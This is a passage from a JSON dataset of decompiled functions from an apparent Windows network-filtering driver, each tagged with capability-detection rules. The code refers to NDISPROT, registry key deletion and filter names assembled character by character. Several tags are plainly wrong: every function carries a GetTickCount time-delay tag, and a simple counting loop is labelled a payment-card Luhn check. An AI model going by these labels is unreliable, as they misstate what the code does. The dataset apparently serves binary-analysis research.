        "decompiled_code": "\nbool fcn.00033ae0(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    bool bVar3;\n    uchar auStack56 [16];\n    \n    bVar3 = false;\n    fcn.00032650(0x7f8f0, auStack56, 0);\n    iVar2 = fcn.00032d34(arg1, 1);\n    if ((iVar2 != 0) && (*(iVar2 + 0x438) != 0)) {\n        iVar1 = fcn.00056104(*(iVar2 + 0x438), arg2, arg3, arg4);\n        bVar3 = iVar1 != 0;\n    }\n    fcn.00032684(0x7f8f0, auStack56, 0);\n    return bVar3;\n}\n",
        "token_count": 198
    },
    "000340ec": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.000340ec(ulong arg1, uint *arg2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    ulong *arg2_00;\n    int64_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    ulong *puVar7;\n    int16_t *piVar8;\n    bool bVar9;\n    uchar auStackX24 [16];\n    \n    arg2_00 = fcn.00030cc4(0x4a0);\n    iVar4 = 0;\n    if (arg2_00 == NULL) {\n        iVar4 = 0x21590004;\n    }\n    else {\n        fcn.0006677c(arg2_00, 0, 0x4a0);\n        *arg2_00 = 0;\n        fcn.00066722(arg2_00 + 0x32, 0x100, 0x14238, arg1);\n        *(arg2_00 + 0x46) = 0;\n        fcn.00066740(arg2_00 + 0x232, arg2_00 + 0x42);\n        *(arg2_00 + 0x86) = 0;\n        if (*(arg2_00 + 0x232) == 0x24) {\n            *(arg2_00 + 0x1c) = 1;\n        }\n        uVar1 = fcn.00034d08(arg2_00 + 0x232);\n        *(arg2_00 + 0x14) = uVar1;\n        *(arg2_00 + 0x444) = 9;\n        fcn.00033dd8(arg2_00 + 0x32, arg2_00);\n        fcn.000324cc(arg2_00 + 0x89);\n        fcn.0002fc18(arg2_00 + 4);\n        fcn.00032650(0x7f8f0, auStackX24, 1);\n        if (*0x7f8e8 < 0x65) {\n            iVar5 = 0;\n            bVar9 = *0x7f8e0 == NULL;\n            puVar7 = *0x7f8e0;\n            iVar2 = iVar4;\n            if (!bVar9) {\n                do {\n                    iVar5 = iVar2;\n                    iVar2 = fcn.00066758(arg2_00 + 0x32, puVar7 + 0x32);\n                    if (iVar2 == 0) break;\n                    puVar7 = *puVar7;\n                    iVar5 = iVar5 + 1;\n                    iVar2 = iVar5;\n                } while (puVar7 != NULL);\n                bVar9 = puVar7 == NULL;\n                if (!bVar9) {\n                    fcn.00032684(0x7f8f0, auStackX24, 1);\n                    fcn.00030d24(arg2_00);\n                    return 0;\n                }\n            }\n            iVar3 = 10;\n            *(arg2_00 + 2) = iVar5 + 1;\n            piVar6 = arg2_00 + 0x232;\n            piVar8 = 0x14220;\n            do {\n                if (iVar3 == 0) break;\n                iVar3 = iVar3 + -1;\n                bVar9 = *piVar6 == *piVar8;\n                piVar6 = piVar6 + 1;\n                piVar8 = piVar8 + 1;\n            } while (bVar9);\n            if (bVar9) {\n                *(arg2_00 + 0x8c) = 1;\n                *0x7f8d8 = iVar5 + 1;\n            }\n            *arg2_00 = *0x7f8e0;\n            *0x7f8e8 = *0x7f8e8 + 1;\n            *0x7f8e0 = arg2_00;\n            if (arg2 != NULL) {\n                *arg2 = *(arg2_00 + 2);\n            }\n            fcn.00032684(0x7f8f0, auStackX24, 1);\n        }\n        else {\n            fcn.00032684(0x7f8f0, auStackX24, 1);\n            iVar4 = -0x3fffff74;\n        }\n    }\n    return iVar4;\n}\n",
        "token_count": 993
    },
    "0003434c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.0003434c(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    ulong uStackX8;\n    ulong auStackX16 [3];\n    ushort uStack120;\n    ushort uStack118;\n    ulong uStack112;\n    ushort uStack104;\n    ushort uStack102;\n    ulong uStack96;\n    uchar auStack88 [16];\n    uint auStack72 [2];\n    ulong uStack64;\n    ushort *puStack56;\n    uint uStack48;\n    ulong uStack40;\n    ulong uStack32;\n    \n    iVar1 = fcn.000307e0();\n    uStack120 = 0x14;\n    uStack112 = 0x14328;\n    uStack118 = 0x16;\n    uStack104 = 0x1a;\n    uStack102 = 0x1c;\n    uStack96 = 0x14308;\n    if (iVar1 < 0x1b) {\n        uVar3 = fcn.00030a40(0x14260, auStackX16);\n        if (uVar3 != 0) {\n            return uVar3;\n        }\n        uVar3 = fcn.0004e130(auStackX16[0], 0x14250, 0x7f910);\n        if (uVar3 != 0) {\n            return uVar3;\n        }\n        puStack56 = &uStack120;\n        auStack72[0] = 0x30;\n        uStack64 = 0;\n        uStack48 = 0x40;\n        uStack40 = 0;\n        uStack32 = 0;\n        uVar3 = fcn.0001e364(0x7f950, 0x100000, auStack72, auStack88, 0, 0, 3, 1, 0x20, 0, 0);\n        if (uVar3 != 0) {\n            return uVar3;\n        }\n        puStack56 = &uStack104;\n        auStack72[0] = 0x30;\n        uStack64 = 0;\n        uStack48 = 0x40;\n        uStack40 = 0;\n        uStack32 = 0;\n        uVar2 = fcn.0001e364(0x7f958, 0x100000, auStack72, auStack88, 0, 0, 3, 1, 0x20, 0, 0);\n        if (uVar2 != 0) {\n            fcn.000666f2(*0x7f950);\n            return uVar2;\n        }\n    }\n    else {\n        uVar3 = fcn.00030a40(0x142f8, &uStackX8);\n        if (uVar3 != 0) {\n            return uVar3;\n        }\n        uVar3 = fcn.0004e130(uStackX8, 0x142e0, 0x7f928);\n        if (uVar3 != 0) {\n            return uVar3;\n        }\n        uVar3 = fcn.0004e130(uStackX8, 0x142c8, 0x7f930);\n        if (uVar3 != 0) {\n            return uVar3;\n        }\n        uVar3 = fcn.0004e130(uStackX8, 0x142b8, 0x7f918);\n        if (uVar3 != 0) {\n            return uVar3;\n        }\n        uVar3 = fcn.0004e130(uStackX8, 0x142a0, 0x7f920);\n        if (uVar3 != 0) {\n            return uVar3;\n        }\n        uVar3 = fcn.0004e130(uStackX8, 0x14290, 0x7f938);\n        if (uVar3 != 0) {\n            return uVar3;\n        }\n        uVar3 = fcn.0004e130(uStackX8, 0x14280, 0x7f940);\n        if (uVar3 != 0) {\n            return uVar3;\n        }\n        uVar3 = fcn.0004e130(uStackX8, 0x14270, 0x7f948);\n        if (uVar3 != 0) {\n            return uVar3;\n        }\n    }\n    *0x7f908 = 1;\n    return 0;\n}\n",
        "token_count": 1014
    },
    "00034e60": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint64_t fcn.00034e60(ulong arg1, uint *arg2)\n\n{\n    uint64_t uVar1;\n    int64_t arg1_00;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    uint32_t uVar5;\n    uint uStack200;\n    uint uStack196;\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    uchar auStack160 [24];\n    uchar auStack136 [84];\n    uint32_t uStack52;\n    \n    uVar4 = 0;\n    uVar3 = 0;\n    uStack200 = 0;\n    fcn.0006677c(&uStack196, 0, 0x24);\n    if (*0x7f908 == 0) {\n        uVar1 = 0x21590001;\n    }\n    else {\n        uStack200 = 0x301;\n        uStack196 = 0;\n        uStack192 = 0x200;\n        uStack188 = 0x100;\n        uStack184 = 1;\n        uVar1 = fcn.000668d2(*0x7f958, 0, 0, 0, auStack160, 0x120003, &uStack200, 0x28, auStack136, 0x5c);\n        if (uVar1 == 0) {\n            uVar5 = uStack52 * 0x18;\n            arg1_00 = fcn.00030c98(uVar5);\n            if (arg1_00 == 0) {\n                uVar1 = 0x21590004;\n            }\n            else {\n                uStack200 = 0x301;\n                uStack184 = 0x102;\n                uStack196 = 0;\n                uVar5 = fcn.000668d2(*0x7f958, 0, 0, 0, auStack160, 0x120003, &uStack200, 0x28, arg1_00, uVar5);\n                uVar1 = uVar5;\n                if (uVar5 == 0) {\n                    if (uStack52 != 0) {\n                        piVar2 = arg1_00 + 4;\n                        do {\n                            uVar3 = uVar4;\n                            if (*piVar2 == arg1) {\n                                *arg2 = *(arg1_00 + uVar4 * 0x18);\n                                break;\n                            }\n                            uVar3 = uVar3 + 1;\n                            uVar4 = uVar3;\n                            piVar2 = piVar2 + 6;\n                        } while (uVar3 < uStack52);\n                    }\n                    if (uVar3 == uStack52) {\n                        uVar1 = 0x21590005;\n                    }\n                }\n                fcn.00030d24(arg1_00);\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 655
    },
    "00035258": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.00035258(void)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    ulong auStackX8 [4];\n    uint auStack248 [2];\n    ulong uStack240;\n    uchar *puStack232;\n    uint uStack224;\n    ulong uStack216;\n    ulong uStack208;\n    uchar auStack200 [16];\n    uchar auStack184 [176];\n    \n    fcn.0002903c(auStack184, 0x52);\n    fcn.00066704(auStack200, auStack184);\n    puStack232 = auStack200;\n    auStack248[0] = 0x30;\n    uStack240 = 0;\n    uStack224 = 0;\n    uStack216 = 0;\n    uStack208 = 0;\n    uVar2 = fcn.00066806(auStackX8, 2, auStack248);\n    if (uVar2 == 0) {\n        uVar1 = fcn.000668d8(auStackX8[0], 0);\n        uVar2 = uVar1;\n        fcn.000666f2(auStackX8[0]);\n    }\n    return uVar2;\n}\n",
        "token_count": 274
    },
    "000352e8": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nint64_t fcn.000352e8(int64_t arg1)\n\n{\n    char cVar1;\n    char cVar2;\n    char *pcVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uchar auStackX16 [24];\n    \n    iVar4 = 0;\n    if (*0x7fea0 == 0) {\n        iVar4 = 0;\n    }\n    else {\n        fcn.00032650(0x7f960, auStackX16, 0);\n        pcVar3 = *0x7fa90;\n        iVar6 = iVar4;\n        while (pcVar3 != NULL) {\n            iVar5 = arg1 - pcVar3;\n            do {\n                cVar1 = *pcVar3;\n                cVar2 = pcVar3[iVar5];\n                if (cVar1 != cVar2) break;\n                pcVar3 = pcVar3 + 1;\n            } while (cVar2 != '\\0');\n            if (cVar1 == cVar2) {\n                iVar4 = 1;\n                break;\n            }\n            iVar6 = iVar6 + 1;\n            pcVar3 = *(iVar6 * 8 + 0x7fa90);\n        }\n        fcn.00032684(0x7f960, auStackX16, 0);\n    }\n    return iVar4;\n}\n",
        "token_count": 307
    },
    "000353cc": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.000353cc(void)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int16_t *piVar3;\n    int64_t iVar4;\n    \n    iVar2 = 0;\n    piVar3 = 0x7fea8;\n    iVar4 = 10;\n    do {\n        iVar1 = *piVar3;\n        piVar3 = piVar3 + 1;\n        iVar2 = iVar2 + (iVar1 != 0);\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    return iVar2;\n}\n",
        "token_count": 134
    },
    "00036880": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00036880(void)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = *0x7fec8;\n    *0x7fec8 = 0;\n    if (iVar1 != 0) {\n        iVar2 = fcn.000307e0();\n        if (iVar2 < 0x1b) {\n            fcn.0004a42c();\n            fcn.00045bc8();\n        }\n        else {\n            fcn.000404d0();\n            fcn.0004a42c();\n            fcn.00045bc8();\n            fcn.00038f60();\n            fcn.00037f54();\n            fcn.0003a488();\n            fcn.0003a168();\n            if (*0x7fec0 != 0) {\n                (**0x7fee8)();\n                *0x7fec0 = 0;\n            }\n            fcn.0003b16c();\n        }\n        fcn.000414fc();\n        fcn.00032d00();\n        fcn.00034618();\n    }\n    *0x7fec8 = 0;\n    return;\n}\n",
        "token_count": 259
    },
    "00036f80": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00036f80(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.000307e0();\n    fcn.0003690c();\n    fcn.0004653c();\n    if (0x1a < iVar1) {\n        fcn.0003ab74();\n    }\n    return;\n}\n",
        "token_count": 77
    },
    "00037e94": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.00037e94(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    ulong *puVar2;\n    ulong uVar3;\n    bool bVar4;\n    uchar auStackX32 [8];\n    \n    uVar3 = 0;\n    iVar1 = fcn.00037bdc(arg3, 0);\n    if (iVar1 == 0) {\n        puVar2 = fcn.00030cc4(0x38);\n        if (puVar2 == NULL) {\n            uVar3 = 0xc000009a;\n        }\n        else {\n            fcn.0006677c(puVar2);\n            puVar2[3] = arg3;\n            puVar2[1] = arg1;\n            puVar2[2] = arg2;\n            fcn.00032650(0x80038, auStackX32, 1);\n            LOCK();\n            bVar4 = *0x7fec8 == 0;\n            *0x7fec8 = *0x7fec8 ^ bVar4 * *0x7fec8;\n            if (bVar4) {\n                uVar3 = 0x21590006;\n            }\n            else {\n                *puVar2 = *0x80030;\n                *0x80030 = puVar2;\n            }\n            fcn.00032684(0x80038, auStackX32, 1);\n        }\n    }\n    else {\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 344
    },
    "00039670": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint64_t fcn.00039670(uint64_t arg1, int64_t arg2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int64_t arg1_00;\n    int64_t arg2_00;\n    int32_t iVar3;\n    int64_t *piVar4;\n    int32_t iVar5;\n    \n    piVar4 = *(arg2 + 8);\n    iVar5 = 0;\n    arg1 = arg1 & 0xffffffff;\n    iVar2 = 0;\n    iVar3 = iVar5;\n    if (piVar4 != NULL) {\n        do {\n            uVar1 = *(piVar4 + 3);\n            fcn.0004c154(0);\n            arg1_00 = fcn.00030cc4(uVar1);\n            iVar2 = iVar3;\n            if (arg1_00 != 0) {\n                arg2_00 = (**0x7ff00)(piVar4, uVar1, arg1_00, 0, 0);\n                if (arg2_00 != 0) {\n                    iVar2 = fcn.00033a68(arg1, arg2_00, uVar1);\n                    if (iVar2 != 0) {\n                        fcn.00045d88(arg1, 0, 0, arg2_00);\n                    }\n                    fcn.0004b004(arg1, arg2_00, arg2_00 + 0xe, uVar1);\n                    iVar2 = fcn.00041ab4(arg1, 0, 0, arg2_00);\n                    if (iVar2 == 0) {\n                        iVar3 = iVar3 + 1;\n                    }\n                    else {\n                        iVar5 = iVar5 + 1;\n                    }\n                }\n                fcn.00030d24(arg1_00);\n                iVar2 = iVar3;\n            }\n            piVar4 = *piVar4;\n            iVar3 = iVar2;\n        } while (piVar4 != NULL);\n        if ((0 < iVar2) && (0 < iVar5)) {\n            return 0xffffffff;\n        }\n    }\n    return 0 < iVar2;\n}\n",
        "token_count": 475
    },
    "0003ab74": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.0003ab74(void)\n\n{\n    int32_t iVar1;\n    int32_t aiStackX8 [8];\n    uchar uStack152;\n    uchar uStack151;\n    ushort uStack150;\n    uchar uStack148;\n    uchar uStack147;\n    ulong uStack136;\n    ulong uStack128;\n    ulong uStack120;\n    ulong uStack112;\n    ulong uStack104;\n    ulong uStack96;\n    ulong uStack88;\n    code *pcStack80;\n    ulong uStack72;\n    ulong uStack64;\n    code *pcStack56;\n    code *pcStack48;\n    ulong uStack40;\n    ulong uStack24;\n    ulong uStack16;\n    \n    fcn.00036fa8(aiStackX8);\n    if (aiStackX8[0] != 0) {\n        if (*0x80190 != 0) {\n            (**0x8e6e8)();\n        }\n        *0x80190 = 0;\n    }\n    if (*0x80190 == 0) {\n        fcn.00036fa8(aiStackX8);\n        fcn.00066704(&uStack24, L\"NDISPROT\");\n        fcn.0006685a(&uStack152, 0x78);\n        uStack96 = 0x45c5c;\n        uStack136 = uStack24;\n        uStack128 = uStack16;\n        uStack88 = 0x3a50c;\n        uStack40 = 0x3a4d8;\n        uStack152 = 0x95;\n        uStack64 = 0x3a514;\n        uStack150 = 0x78;\n        pcStack56 = fcn.0001612c;\n        uStack151 = 1;\n        pcStack48 = fcn.0001612c;\n        uStack148 = 6;\n        pcStack80 = fcn.000578a0;\n        uStack147 = 0;\n        uStack112 = 0x3ab54;\n        uStack120 = 0;\n        uStack104 = 0x3a860;\n        uStack72 = 0;\n        iVar1 = (**0x8e6c8)(uStack24, 0, &uStack152, 0x80190);\n        if (iVar1 != 0) {\n            *0x80190 = 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 534
    },
    "0003bfd0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t fcn.0003bfd0(void)\n\n{\n    ulong in_R9;\n    int32_t aiStackX16 [2];\n    int32_t aiStackX24 [2];\n    ulong uStackX32;\n    ushort uVar1;\n    uint uStack292;\n    uchar uStack280;\n    uchar uStack279;\n    ulong uStack272;\n    ulong uStack264;\n    ulong uStack256;\n    ulong uStack248;\n    ulong uStack240;\n    ulong uStack232;\n    ulong uStack224;\n    ulong uStack216;\n    ulong uStack208;\n    ulong uStack200;\n    ulong uStack192;\n    ulong uStack184;\n    ulong uStack176;\n    ulong uStack168;\n    ulong uStack160;\n    ulong uStack152;\n    ulong uStack144;\n    \n    uStack184 = 0x14b70;\n    uVar1 = 0x22;\n    uStackX32 = 0;\n    fcn.0006677c(&uStack280, 0, 0xd0, in_R9, 0x22, 0x14b70);\n    uStack192 = CONCAT44(uStack292, CONCAT22(0x24, uVar1));\n    uStack224 = 0x3bf00;\n    uStack216 = 0x3bf24;\n    uStack208 = 0x3bf34;\n    uStack200 = 0x3bf54;\n    uStack176 = 0x3bfa0;\n    uStack168 = 0x3bf64;\n    uStack160 = 0x3bf84;\n    uStack152 = 0x3bfb8;\n    uStack280 = 5;\n    uStack279 = 1;\n    uStack272 = 0x3be64;\n    uStack264 = 0x3be80;\n    uStack256 = 0x3be94;\n    uStack248 = 0x3beb0;\n    uStack240 = 0x3bed0;\n    uStack232 = 0x3bee4;\n    uStack144 = 0;\n    (**0x11050)(uStack192, aiStackX24, &uStackX32, &uStack280, 0xd0);\n    aiStackX16[0] = aiStackX24[0];\n    if (aiStackX24[0] == 0) {\n        *0x801cc = fcn.0003d23c(uStackX32, 0x200, 0x3be64);\n        if (((((*0x801cc == -1) || (*0x801d0 = fcn.0003d23c(uStackX32, 0x200, 0x3be80),  *0x801d0 == -1)) ||\n             (*0x801d4 = fcn.0003d23c(uStackX32, 0x200, 0x3be94),  *0x801d4 == -1)) ||\n            (((*0x801d8 = fcn.0003d23c(uStackX32, 0x200, 0x3beb0),  *0x801d8 == -1 ||\n              (*0x801dc = fcn.0003d23c(uStackX32, 0x200, 0x3bed0),  *0x801dc == -1)) ||\n             ((*0x801e0 = fcn.0003d23c(uStackX32, 0x200, 0x3bee4),  *0x801e0 == -1 ||\n              ((*0x801e4 = fcn.0003d23c(uStackX32, 0x200, 0x3bf00),  *0x801e4 == -1 ||\n               (*0x801e8 = fcn.0003d23c(uStackX32, 0x200, 0x3bf24),  *0x801e8 == -1)))))))) ||\n           ((*0x801ec = fcn.0003d23c(uStackX32, 0x200, 0x3bf34),  *0x801ec == -1 ||\n            ((((*0x801f0 = fcn.0003d23c(uStackX32, 0x200, 0x3bf54),  *0x801f0 == -1 ||\n               (*0x801f4 = fcn.0003d23c(uStackX32, 0x200, 0x3bfa0),  *0x801f4 == -1)) ||\n              (*0x801f8 = fcn.0003d23c(uStackX32, 0x200, 0x3bf64),  *0x801f8 == -1)) ||\n             (*0x801fc = fcn.0003d23c(uStackX32, 0x200, 0x3bf84),  *0x801fc == -1)))))) {\n            aiStackX16[0] = 0x21590005;\n        }\n        else {\n            *0x80200 = fcn.0003d23c(uStackX32, 0x200, 0x3bfb8);\n            aiStackX16[0] = 0;\n            if (*0x80200 == -1) {\n                aiStackX16[0] = 0x21590005;\n            }\n        }\n        (*_fcn.00011048)(aiStackX16, uStackX32);\n        aiStackX24[0] = aiStackX16[0];\n    }\n    return aiStackX24[0];\n}\n",
        "token_count": 1246
    },
    "0003c34c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "create or open registry key",
            "delete registry key"
        ],
        "decompiled_code": "\nuint64_t fcn.0003c34c(ulong arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    ulong auStackX24 [2];\n    uint auStack584 [2];\n    ulong uStack576;\n    uchar *puStack568;\n    uint uStack560;\n    ulong uStack552;\n    ulong uStack544;\n    uchar auStack536 [16];\n    uchar auStack520 [512];\n    \n    fcn.00066722(auStack520, 0x100, 0x11b48, arg1, arg2);\n    fcn.00066704(auStack536, auStack520);\n    puStack568 = auStack536;\n    auStack584[0] = 0x30;\n    uStack576 = 0;\n    uStack560 = 0x40;\n    uStack552 = 0;\n    uStack544 = 0;\n    uVar1 = fcn.000666fe(auStackX24, 0xf003f, auStack584);\n    if (uVar1 == 0) {\n        uVar2 = fcn.00066728(auStackX24[0]);\n    }\n    else {\n        uVar2 = uVar1;\n        if (uVar1 == 0xc0000008) {\n            uVar2 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 310
    },
    "0003e664": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.0003e664(uint32_t *arg1, uchar *arg2, ulong arg3)\n\n{\n    uchar uVar1;\n    int16_t *piVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int16_t *piVar6;\n    bool bVar7;\n    uint64_t uVar5;\n    \n    uVar5 = 0;\n    *arg2 = 0;\n    piVar2 = *(arg1 + 2);\n    piVar6 = *arg1 + piVar2;\n    do {\n        bVar7 = piVar6 == piVar2;\n        while( true ) {\n            if (piVar6 < piVar2 || bVar7) {\n                return;\n            }\n            piVar6 = piVar6 + -1;\n            if (*piVar6 == 0) break;\n            uVar3 = uVar5 + 1;\n            uVar5 = uVar3;\n            if (((*piVar6 == 0x5c) || (*piVar6 == 0x2f)) || (bVar7 = piVar6 == piVar2,  bVar7)) {\n                if (arg3 <= uVar3) {\n                    uVar5 = arg3 - 1;\n                }\n                iVar4 = uVar5;\n                arg2[uVar5] = 0;\n                if (iVar4 == 0) {\n                    return;\n                }\n                arg2 = arg2 + iVar4 + -1;\n                piVar6 = piVar6 + iVar4;\n                do {\n                    uVar1 = *piVar6;\n                    uVar3 = uVar5 - 1;\n                    uVar5 = uVar3;\n                    piVar6 = piVar6 + -1;\n                    *arg2 = uVar1;\n                    arg2 = arg2 + -1;\n                } while (uVar3 != 0);\n                return;\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 428
    },
    "0003eb44": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nint32_t fcn.0003eb44(void)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    int16_t *piVar5;\n    int16_t aiStack280 [4];\n    ushort uStack272;\n    ushort uStack270;\n    ushort uStack268;\n    ushort uStack266;\n    ushort uStack264;\n    ushort uStack262;\n    ushort uStack260;\n    ushort uStack258;\n    ushort uStack256;\n    uchar auStack250 [2];\n    int16_t aiStack248 [4];\n    ushort uStack240;\n    ushort uStack238;\n    ushort uStack236;\n    ushort uStack234;\n    ushort uStack232;\n    ushort uStack230;\n    ushort uStack228;\n    ushort uStack226;\n    ushort uStack224;\n    ushort uStack222;\n    uchar auStack218 [2];\n    int16_t aiStack216 [4];\n    ushort uStack208;\n    ushort uStack206;\n    ushort uStack204;\n    ushort uStack202;\n    ushort uStack200;\n    ushort uStack198;\n    ushort uStack196;\n    ushort uStack194;\n    ushort uStack192;\n    ushort uStack190;\n    ushort uStack188;\n    uchar auStack186 [2];\n    int16_t aiStack184 [4];\n    ushort uStack176;\n    ushort uStack174;\n    ushort uStack172;\n    ushort uStack170;\n    ushort uStack168;\n    ushort uStack166;\n    ushort uStack164;\n    ushort uStack162;\n    ushort uStack160;\n    ushort uStack158;\n    ushort uStack156;\n    int16_t aiStack154 [5];\n    ushort uStack144;\n    ushort uStack142;\n    ushort uStack140;\n    ushort uStack138;\n    ushort uStack136;\n    ushort uStack134;\n    ushort uStack132;\n    ushort uStack130;\n    ushort uStack128;\n    ushort uStack126;\n    ushort uStack124;\n    uint uStack120;\n    uchar auStack116 [12];\n    int16_t *piStack104;\n    uint uStack88;\n    \n    aiStack184[0] = 0x73;\n    aiStack184[1] = 0x74;\n    aiStack216[0] = 0x65;\n    aiStack184[3] = 0x65;\n    aiStack184[2] = 0x72;\n    uStack174 = 0x6d;\n    aiStack216[1] = 0x73;\n    uStack176 = 0x61;\n    uStack172 = 0x5f;\n    uStack170 = 0x66;\n    uStack168 = 0x69;\n    uStack166 = 0x6c;\n    uStack164 = 0x74;\n    aiStack216[2] = 0x74;\n    aiStack216[3] = 0x62;\n    uStack208 = 0x6c;\n    uStack206 = 0x5f;\n    uStack204 = 0x66;\n    uStack202 = 0x69;\n    uStack200 = 0x6c;\n    uStack198 = 0x74;\n    uStack196 = 0x65;\n    uStack194 = 0x72;\n    uStack162 = 0x65;\n    uStack160 = 0x72;\n    uStack158 = 0;\n    uStack156 = 0;\n    aiStack154[0] = 0;\n    uStack192 = 0;\n    uStack190 = 0;\n    uStack188 = 0;\n    aiStack154[1] = 0x72;\n    aiStack154[2] = 0x6b;\n    aiStack154[3] = 0x6e;\n    aiStack154[4] = 0x67;\n    uStack144 = 0x5f;\n    uStack142 = 0x73;\n    uStack140 = 0x65;\n    uStack138 = 0x73;\n    uStack136 = 0x73;\n    uStack134 = 0x69;\n    uStack132 = 0x6f;\n    uStack130 = 0x6e;\n    uStack128 = 0;\n    uStack126 = 0;\n    uStack124 = 0;\n    aiStack248[0] = 0x73;\n    aiStack248[1] = 0x74;\n    aiStack248[2] = 0x72;\n    aiStack248[3] = 0x65;\n    uStack240 = 0x61;\n    uStack238 = 0x6d;\n    uStack236 = 0x5f;\n    uStack234 = 99;\n    uStack232 = 0x61;\n    uStack230 = 0x6f;\n    uStack228 = 0x74;\n    uStack226 = 0;\n    uStack224 = 0;\n    uStack222 = 0;\n    aiStack280[0] = 0x65;\n    aiStack280[1] = 0x73;\n    aiStack280[2] = 0x74;\n    aiStack280[3] = 0x62;\n    uStack272 = 0x6c;\n    uStack270 = 0x5f;\n    uStack268 = 99;\n    uStack266 = 0x61;\n    uStack264 = 0x6f;\n    uStack262 = 0x74;\n    uStack260 = 0;\n    uStack258 = 0;\n    uStack256 = 0;\n    uStack120 = 0;\n    fcn.0006677c(auStack116, 0, 0x44);\n    uVar4 = 0xffffffffffffffff;\n    piVar5 = aiStack154;\n    uVar3 = uVar4;\n    do {\n        piVar5 = piVar5 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*piVar5 != 0);\n    fcn.00035414(aiStack154 + 1, aiStack154 + ~uVar3, aiStack154 + ~uVar3 + 1);\n    uVar3 = uVar4;\n    piVar5 = aiStack248;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        iVar1 = *piVar5;\n        piVar5 = piVar5 + 1;\n    } while (iVar1 != 0);\n    fcn.00035414(aiStack248, auStack250 + ~uVar3 * 2, aiStack248 + ~uVar3);\n    uVar3 = uVar4;\n    piVar5 = aiStack280;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        iVar1 = *piVar5;\n        piVar5 = piVar5 + 1;\n    } while (iVar1 != 0);\n    fcn.00035414(aiStack280, aiStack280 + (~uVar3 - 1), aiStack280 + ~uVar3);\n    uVar3 = uVar4;\n    piVar5 = aiStack184;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        iVar1 = *piVar5;\n        piVar5 = piVar5 + 1;\n    } while (iVar1 != 0);\n    fcn.00035414(aiStack184, auStack186 + ~uVar3 * 2, aiStack184 + ~uVar3);\n    piVar5 = aiStack216;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        iVar1 = *piVar5;\n        piVar5 = piVar5 + 1;\n    } while (iVar1 != 0);\n    fcn.00035414(aiStack216, auStack218 + ~uVar4 * 2, aiStack216 + ~uVar4);\n    piStack104 = aiStack154 + 1;\n    uStack88 = 1;\n    if (*0x802b0 == 0) {\n        fcn.0003da50();\n        iVar2 = (**0x7ff98)(0, 10, 0, &uStack120, 0x802b0);\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    iVar2 = (**0x7ff88)(*0x802b0, 0);\n    if (iVar2 == 0) {\n        iVar2 = fcn.0003de04(0x14db0, 0x15728, *0x802a8, 0x3e194);\n        if ((((iVar2 == 0) && (iVar2 = fcn.0003de04(0x14fb0, 0x15738, 